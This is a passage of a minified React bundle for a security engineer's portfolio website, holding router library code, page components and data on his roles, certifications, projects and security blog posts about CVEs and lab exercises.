0&&(n=[]),t===void 0&&(t=null),s===void 0&&(s=null),e==null){var i;if(!t)return null;if(t.errors)e=t.matches;else if((i=s)!=null&&i.v7_partialHydration&&n.length===0&&!t.initialized&&t.matches.length>0)e=t.matches;else return null}let a=e,l=(r=t)==null?void 0:r.errors;if(l!=null){let u=a.findIndex(m=>m.route.id&&(l==null?void 0:l[m.route.id])!==void 0);u>=0||ne(!1),a=a.slice(0,Math.min(a.length,u+1))}let o=!1,c=-1;if(t&&s&&s.v7_partialHydration)for(let u=0;u<a.length;u++){let m=a[u];if((m.route.HydrateFallback||m.route.hydrateFallbackElement)&&(c=u),m.route.id){let{loaderData:h,errors:g}=t,k=m.route.loader&&h[m.route.id]===void 0&&(!g||g[m.route.id]===void 0);if(m.route.lazy||k){o=!0,c>=0?a=a.slice(0,c+1):a=[a[0]];break}}}return a.reduceRight((u,m,h)=>{let g,k=!1,y=null,x=null;t&&(g=l&&m.route.id?l[m.route.id]:void 0,y=m.route.errorElement||wg,o&&(c<0&&h===0?(Ng("route-fallback"),k=!0,x=null):c===h&&(k=!0,x=m.route.hydrateFallbackElement||null)));let p=n.concat(a.slice(0,h+1)),f=()=>{let v;return g?v=y:k?v=x:m.route.Component?v=S.createElement(m.route.Component,null):m.route.element?v=m.route.element:v=u,S.createElement(xg,{match:m,routeContext:{outlet:u,matches:p,isDataRoute:t!=null},children:v})};return t&&(m.route.ErrorBoundary||m.route.errorElement||h===0)?S.createElement(kg,{location:t.location,revalidation:t.revalidation,component:y,error:g,children:f(),routeContext:{outlet:null,matches:p,isDataRoute:!0}}):f()},null)}var Md=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(Md||{}),jd=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(jd||{});function _g(e){let n=S.useContext(ho);return n||ne(!1),n}function Sg(e){let n=S.useContext(dg);return n||ne(!1),n}function Eg(e){let n=S.useContext(qn);return n||ne(!1),n}function Id(e){let n=Eg(),t=n.matches[n.matches.length-1];return t.route.id||ne(!1),t.route.id}function Tg(){var e;let n=S.useContext(Pd),t=Sg(),s=Id();return n!==void 0?n:(e=t.errors)==null?void 0:e[s]}function Cg(){let{router:e}=_g(Md.UseNavigateStable),n=Id(jd.UseNavigateStable),t=S.useRef(!1);return Ld(()=>{t.current=!0}),S.useCallback(function(r,i){i===void 0&&(i={}),t.current&&(typeof r=="number"?e.navigate(r):e.navigate(r,Ds({fromRouteId:n},i)))},[e,n])}const Dc={};function Ng(e,n,t){Dc[e]||(Dc[e]=!0)}function Ag(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function Sn(e){ne(!1)}function Pg(e){let{basename:n="/",children:t=null,location:s,navigationType:r=Rn.Pop,navigator:i,static:a=!1,future:l}=e;qs()&&ne(!1);let o=n.replace(/^\/*/,"/"),c=S.useMemo(()=>({basename:o,navigator:i,static:a,future:Ds({v7_relativeSplatPath:!1},l)}),[o,l,i,a]);typeof s=="string"&&(s=qt(s));let{pathname:u="/",search:m="",hash:h="",state:g=null,key:k="default"}=s,y=S.useMemo(()=>{let x=po(u,o);return x==null?null:{location:{pathname:x,search:m,hash:h,state:g,key:k},navigationType:r}},[o,u,m,h,g,k,r]);return y==null?null:S.createElement(ft.Provider,{value:c},S.createElement(Ni.Provider,{children:t,value:y}))}function Lg(e){let{children:n,location:t}=e;return gg(rl(n),t)}new Promise(()=>{});function rl(e,n){n===void 0&&(n=[]);let t=[];return S.Children.forEach(e,(s,r)=>{if(!S.isValidElement(s))return;let i=[...n,r];if(s.type===S.Fragment){t.push.apply(t,rl(s.props.children,i));return}s.type!==Sn&&ne(!1),!s.props.index||!s.props.children||ne(!1);let a={id:s.props.id||i.join("-"),caseSensitive:s.props.caseSensitive,element:s.props.element,Component:s.props.Component,index:s.props.index,path:s.props.path,loader:s.props.loader,action:s.props.action,errorElement:s.props.errorElement,ErrorBoundary:s.props.ErrorBoundary,hasErrorBoundary:s.props.ErrorBoundary!=null||s.props.errorElement!=null,shouldRevalidate:s.props.shouldRevalidate,handle:s.props.handle,lazy:s.props.lazy};s.props.children&&(a.children=rl(s.props.children,i)),t.push(a)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function il(){return il=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},il.apply(this,arguments)}function Rg(e,n){if(e==null)return{};var t={},s=Object.keys(e),r,i;for(i=0;i<s.length;i++)r=s[i],!(n.indexOf(r)>=0)&&(t[r]=e[r]);return t}function Og(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function Mg(e,n){return e.button===0&&(!n||n==="_self")&&!Og(e)}const jg=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],Ig="6";try{window.__reactRouterVersion=Ig}catch{}const zg="startTransition",Bc=Th[zg];function Dg(e){let{basename:n,children:t,future:s,window:r}=e,i=S.useRef();i.current==null&&(i.current=Bm({window:r,v5Compat:!0}));let a=i.current,[l,o]=S.useState({action:a.action,location:a.location}),{v7_startTransition:c}=s||{},u=S.useCallback(m=>{c&&Bc?Bc(()=>o(m)):o(m)},[o,c]);return S.useLayoutEffect(()=>a.listen(u),[a,u]),S.useEffect(()=>Ag(s),[s]),S.createElement(Pg,{basename:n,children:t,location:l.location,navigationType:l.action,navigator:a,future:s})}const Bg=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",Fg=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Xe=S.forwardRef(function(n,t){let{onClick:s,relative:r,reloadDocument:i,replace:a,state:l,target:o,to:c,preventScrollReset:u,viewTransition:m}=n,h=Rg(n,jg),{basename:g}=S.useContext(ft),k,y=!1;if(typeof c=="string"&&Fg.test(c)&&(k=c,Bg))try{let v=new URL(window.location.href),w=c.startsWith("//")?new URL(v.protocol+c):new URL(c),_=po(w.pathname,g);w.origin===v.origin&&_!=null?c=_+w.search+w.hash:y=!0}catch{}let x=hg(c,{relative:r}),p=Ug(c,{replace:a,state:l,target:o,preventScrollReset:u,relative:r,viewTransition:m});function f(v){s&&s(v),v.defaultPrevented||p(v)}return S.createElement("a",il({},h,{href:k||x,onClick:y||i?s:f,ref:t,target:o}))});var Fc;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(Fc||(Fc={}));var Uc;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(Uc||(Uc={}));function Ug(e,n){let{target:t,replace:s,state:r,preventScrollReset:i,relative:a,viewTransition:l}=n===void 0?{}:n,o=Rd(),c=Xs(),u=Od(e,{relative:a});return S.useCallback(m=>{if(Mg(m,t)){m.preventDefault();let h=s!==void 0?s:ii(c)===ii(u);o(e,{replace:h,state:r,preventScrollReset:i,relative:a,viewTransition:l})}},[c,o,u,s,r,t,e,i,a,l])}function Vg({onToggleTheme:e,theme:n}){const t=Xs(),s=Rd(),r=t.pathname==="/blogs",i=t.pathname.startsWith("/projects"),a=t.pathname.startsWith("/certifications"),l=t.pathname.startsWith("/cve-map"),o=t.hash==="#contact"||t.pathname==="/contact",c=(u,m)=>{u.preventDefault();const h=()=>{const g=document.getElementById(m);g&&g.scrollIntoView({behavior:"smooth",block:"start"})};t.pathname!=="/"?(s("/"),setTimeout(h,80)):h()};return d.jsx("nav",{className:"navbar",children:d.jsxs("div",{className:"container nav-container",children:[d.jsxs("div",{className:"logo",children:[d.jsx("i",{className:"fas fa-satellite-dish mug-icon","aria-hidden":"true"})," Hem Parekh | Security Engineer"]}),d.jsxs("ul",{className:"nav-links",children:[d.jsx("li",{children:d.jsx("a",{href:"#about",onClick:u=>c(u,"about"),children:"About"})}),d.jsx("li",{children:d.jsx("a",{href:"#experience",onClick:u=>c(u,"experience"),children:"Experience"})}),d.jsx("li",{children:d.jsx(Xe,{to:"/projects",className:i?"active":"",children:"Projects"})}),d.jsx("li",{children:d.jsx(Xe,{to:"/certifications",className:a?"active":"",children:"Certs"})}),d.jsx("li",{children:d.jsx(Xe,{to:"/blogs",className:r?"active":"",children:"Blog"})}),d.jsx("li",{children:d.jsx(Xe,{to:"/cve-map",className:l?"active":"",children:"CVE Map"})}),d.jsx("li",{children:d.jsx("a",{href:"#contact",className:o?"active":"",onClick:u=>c(u,"contact"),children:"Contact"})})]}),d.jsxs("button",{className:"theme-toggle",id:"themeToggle",onClick:e,children:["HUD Glow: ",n==="dark"?"On":"Off"]})]})})}function Hg(){return d.jsx("footer",{className:"footer",children:d.jsx("div",{className:"container",children:d.jsx("p",{children:"© 2024 Hem Parekh | All rights reserved."})})})}function Ai(e=.15){const n=S.useRef(null),[t,s]=S.useState(!1);return S.useEffect(()=>{const r=n.current;if(!r)return;const i=new IntersectionObserver(([a])=>{a.isIntersecting&&(s(!0),i.unobserve(a.target))},{threshold:e});return i.observe(r),()=>i.disconnect()},[e]),[n,t]}function Wg({data:e}){const[n,t]=Ai();return d.jsx("header",{className:`hero reveal ${t?"visible":""}`,id:"home",ref:n,children:d.jsxs("div",{className:"hero-content container",children:[d.jsxs("div",{className:"hero-copy",children:[d.jsx("div",{className:"hero-badge",children:"Operator: Hem Parekh // Access Granted"}),d.jsx("h1",{children:d.jsxs("span",{"data-glitch":`Hello, I'm ${e.highlight}.`,children:["Hello, I'm ",d.jsx("span",{className:"highlight",children:e.highlight}),"."]})}),d.jsxs("div",{className:"hero-descriptors",children:[d.jsx("span",{className:"pill",children:"Security Engineer"}),d.jsx("span",{className:"pill",children:"Pen Tester"}),d.jsx("span",{className:"pill",children:"Threat Hunter"})]}),d.jsx("p",{className:"hero-funfact",children:"Low-trust runtime. Intrusions logged, anomalies hunted."}),d.jsx("p",{children:e.blurb}),d.jsxs("div",{className:"hero-ctas",children:[d.jsx(Xe,{className:"button primary clipboard",to:"/projects",children:"View Projects"}),d.jsx(Xe,{className:"button ghost clipboard",to:"/certifications",children:"View Certificates"})]}),d.jsx("div",{className:"scroll-down-arrow",children:d.jsx("a",{href:"#about",className:"arrow-link",children:d.jsx("span",{children:"↓"})})})]}),d.jsx("div",{className:"hero-photo-card",children:d.jsx("div",{className:"polaroid",children:d.jsx("img",{src:e.image,className:"heading-image glitch",alt:"Heading"})})})]})})}function $g({links:e=[]}){return d.jsx("div",{className:"social-icons",children:e.map(n=>d.jsx("a",{href:n.href,target:"_blank",rel:"noreferrer","aria-label":n.label||"Social link",children:d.jsx("i",{className:n.icon})},n.href))})}function Gg({data:e,socials:n}){const[t,s]=Ai();return d.jsx("section",{className:`about reveal ${s?"visible":""}`,id:"about",ref:t,children:d.jsxs("div",{className:"container about-container",children:[d.jsx("div",{className:"about-photo",children:d.jsx("img",{src:e.image,alt:"Hem Parekh",style:{maxWidth:"100%",borderRadius:"10px"}})}),d.jsxs("div",{className:"about-content",children:[d.jsx("h2",{children:e.title}),d.jsx("p",{children:e.text}),d.jsx($g,{links:n})]})]})})}const Yg={"Privacy Engineer":{domains:["Privacy","Cloud"],impact:"High",capabilities:{"Privacy Reviews":!0,"Threat Modeling":!0,Automation:!0,Compliance:!0,"Incident Response":!1,"Pen Testing":!1},tools:["AWS","Splunk","Python","Terraform"],outcome:"Cut data exposure paths; embedded privacy-by-design across services. Built repeatable reviews and automated kill-switches.",actions:[]},"Cybersecurity Engineer Intern":{domains:["AppSec","Infra"],impact:"High",capabilities:{"Pen Testing":!0,"Threat Modeling":!0,Automation:!0,Compliance:!0,"Incident Response":!1,"Privacy Reviews":!1},outcome:"8 critical issues fixed; 25+ web apps hardened.",actions:[]},"Research Assistant":{domains:["Research","Compliance"],impact:"Medium",capabilities:{Compliance:!0,"Threat Modeling":!0,"Privacy Reviews":!0,Automation:!1,"Pen Testing":!1,"Incident Response":!1},tools:["NIST 800-53","ISO 27001","Python"],outcome:"Risk assessments aligned to NIST/ISO; controls implemented with teams.",actions:[]},"Cybersecurity Analyst Intern":{domains:["AppSec","Infra"],impact:"Medium",capabilities:{"Pen Testing":!0,"Threat Modeling":!0,Compliance:!0,Automation:!1,"Incident Response":!1,"Privacy Reviews":!1},tools:["Nessus","Burp","Splunk"],outcome:"Assessed 18 internal systems; delivered remediation guidance.",actions:[]},"Security Operational Analyst (SOC)":{domains:["Detection","Operations"],impact:"Medium",capabilities:{"Incident Response":!0,"Threat Modeling":!1,"Pen Testing":!1,Compliance:!1,Automation:!0,"Privacy Reviews":!1},outcome:"Monitored 100+ devices; improved alert handling and root-cause analysis.",actions:[]}};function qg({item:e,idx:n}){const[t,s]=Ai(),r=Yg[e.role]||{},i=r.domains||[],a=r.capabilities||{},l=r.actions||[e.desc];return d.jsxs("article",{className:`exp-card reveal ${s?"visible":""} card-hover`,ref:t,style:{transitionDelay:`${n*80}ms`},children:[d.jsxs("header",{className:"exp-card-header",children:[d.jsxs("div",{children:[d.jsx("h3",{children:e.role}),d.jsx("h4",{children:e.org})]}),d.jsx("div",{className:"exp-dates",children:e.range})]}),d.jsxs("div",{className:"exp-chips",children:[i.map(o=>d.jsx("span",{className:"pill",children:o},o)),r.impact&&d.jsxs("span",{className:"pill impact",children:["Impact: ",r.impact]})]}),d.jsx("div",{className:"exp-outcome",children:r.outcome||e.desc}),d.jsx("div",{className:"exp-capabilities",children:Object.entries(a).map(([o,c])=>d.jsxs("div",{className:`exp-cap ${c?"on":"off"}`,children:[d.jsx("span",{className:"dot-cap"}),o]},o))}),d.jsx("ul",{className:"exp-actions",children:l.map(o=>d.jsx("li",{children:o},o))})]},`${e.range}-${e.role}`)}function Xg({items:e}){const[n,t]=Ai(.1);return d.jsx("section",{className:`experience reveal ${t?"visible":""}`,id:"experience",ref:n,children:d.jsxs("div",{className:"container",children:[d.jsx("div",{className:"section-header",children:d.jsxs("div",{children:[d.jsx("h2",{children:"EXPERIENCE"}),d.jsx("p",{className:"section-subtitle",children:"Field reports from building and breaking systems."})]})}),d.jsx("div",{className:"experience-grid",children:e.map((s,r)=>d.jsx(qg,{item:s,idx:r},`${s.range}-${s.role}`))})]})})}function Mt({title:e,subtitle:n,id:t,children:s}){const r=S.useId(),i=t||`window-${r}`;return d.jsx("section",{className:"hud-window",id:i,children:d.jsxs("div",{className:"hud-window__chrome",children:[d.jsxs("div",{className:"hud-window__header",children:[d.jsxs("div",{className:"hud-window__title",children:[d.jsx("span",{className:"led on"}),d.jsx("span",{className:"hud-label",children:e})]}),d.jsxs("div",{className:"hud-window__meta",children:[d.jsx("span",{className:"hud-chip",children:n||"interactive"}),d.jsx("span",{className:"hud-chip ghost",children:"live feed"})]})]}),d.jsxs("div",{className:"hud-window__body",children:[d.jsx("div",{className:"hud-scanline"}),s]})]})})}const Kg=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],Qg={title:"Hello, I'm Hem Parekh.",highlight:"Hem Parekh",image:"/images/heading_image.webp",blurb:"Security engineer and pen tester building hardened systems, staging exploit labs, and mapping attack surfaces before adversaries do."},Zg={title:"ABOUT ME",image:"/images/profile.jpeg",text:"I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building resilient software and unearthing vulnerabilities. I blend engineering discipline with a hacker’s curiosity to design secure systems and to stress-test the ones that already exist. When I’m not pulling threads on a bug, I’m writing up what I find so other defenders can move faster."},Jg=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],ev=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],nv=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],tv={title:"Ops Log // Latest Signals",subtitle:"Field notes from exploit labs, CVE hunts, and defensive experiments.",social:[{href:"#",icon:"fab fa-twitter"},{href:"#",icon:"fab fa-linkedin-in"},{href:"#",icon:"fab fa-github"},{href:"#",icon:"fab fa-instagram"}]},al=[{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}];function Vc(){return d.jsxs("div",{className:"hud-workspace",children:[d.jsx(Mt,{title:"Identity // Access Granted",subtitle:"Operator profile",initialSize:{width:1160},children:d.jsx(Wg,{data:Qg})}),d.jsx(Mt,{title:"Experience Feed",subtitle:"roles / capabilities",initialPosition:{x:8,y:0},children:d.jsx(Xg,{items:Jg})}),d.jsx(Mt,{title:"Bio + Links",subtitle:"signal",initialPosition:{x:-4,y:0},children:d.jsx(Gg,{data:Zg,socials:Kg})})]})}function sv({data:e}){return d.jsx("header",{className:"blog-welcome-section",children:d.jsxs("div",{className:"container text-center",children:[d.jsx("h1",{className:"glitchy","data-text":e.title,children:e.title}),d.jsx("p",{className:"blog-subtitle",children:e.subtitle})]})})}function rv({posts:e,page:n=1,totalPages:t=1,onPageChange:s}){return d.jsx("section",{className:"blog-list-section",children:d.jsxs("div",{className:"container",children:[e.map(r=>d.jsxs("article",{className:"blog-row",children:[d.jsxs("div",{className:"blog-row-meta",children:[d.jsx("div",{className:"blog-row-date",children:r.date}),d.jsx("div",{className:"blog-row-time",children:r.readTime})]}),d.jsxs("div",{className:"blog-row-body",children:[d.jsx(Xe,{to:r.href,className:"blog-row-title",children:r.title}),d.jsx("p",{className:"blog-row-excerpt",children:r.excerpt}),d.jsx("div",{className:"blog-tags",children:d.jsx("span",{className:"pill",children:"Security"})})]}),d.jsx("div",{className:"blog-row-cta",children:d.jsx(Xe,{to:r.href,className:"view-credentials",children:"Read"})})]},r.title)),t>1&&d.jsxs("div",{className:"blog-pagination",children:[d.jsx("button",{className:"pill",disabled:n===1,onClick:()=>s==null?void 0:s(Math.max(1,n-1)),children:"Previous"}),d.jsxs("span",{className:"blog-page-indicator",children:["Page ",n," of ",t]}),d.jsx("button",{className:"pill",disabled:n===t,onClick:()=>s==null?void 0:s(Math.min(t,n+1)),children:"Next"})]})]})})}function iv({posts:e,onFilter:n}){const[t,s]=S.useState(""),r=S.useMemo(()=>t.trim()?e.filter(a=>a.title.toLowerCase().includes(t.toLowerCase())||a.excerpt.toLowerCase().includes(t.toLowerCase())):e,[t,e]),i=a=>{s(a.target.value),n(r)};return d.jsxs("div",{className:"blog-search",children:[d.jsx("label",{className:"search-label",htmlFor:"blog-search",children:"Search posts"}),d.jsxs("div",{className:"search-shell",children:[d.jsx("i",{className:"fas fa-search search-icon","aria-hidden":"true"}),d.jsx("input",{id:"blog-search",type:"search",value:t,onChange:i,placeholder:"Type a keyword…",className:"search-input"})]})]})}function 